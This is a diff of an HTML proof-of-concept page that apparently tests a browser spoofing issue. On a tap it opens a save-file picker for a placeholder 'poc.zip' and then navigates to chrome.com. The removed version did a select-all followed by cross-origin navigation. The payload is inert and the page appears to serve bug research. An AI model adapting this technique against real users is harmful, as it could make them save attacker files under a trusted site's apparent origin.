@@ -1,24 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Origin A</title>
-<script>
-function trigger() {
-  // Step 1: create selection
-  document.execCommand("selectAll");
-
-  // Small delay to ensure selection state is committed
-  setTimeout(() => {
-    // Step 2: cross-origin navigation
-    location.href = "https://chrome.com/";
-  }, 50);
-}
-</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Save Picker → chrome.com</title>
 </head>
-<body onmousedown="trigger()">
-<h2>chrome wants u to evil.com>
+<body>
 
-<p>Tap anywhere</p>
+<h2>Save File Picker (NOT upload)</h2>
+<p>Tap once: save dialog opens, then navigates to chrome.com.</p>
+
+<script>
+async function trigger() {
+  const zip = new Blob(["ZIP POC"], { type: "application/zip" });
+
+  const handle = await window.showSaveFilePicker({
+    suggestedName: "poc.zip",
+    types: [{
+      description: "ZIP",
+      accept: { "application/zip": [".zip"] }
+    }]
+  });
+
+  const w = await handle.createWritable();
+  await w.write(zip);
+  await w.close();
+
+  // AFTER save → navigate
+  location.href = "https://chrome.com/";
+}
+
+document.body.addEventListener("mousedown", trigger, { once: true });
+</script>
+
 </body>
 </html>
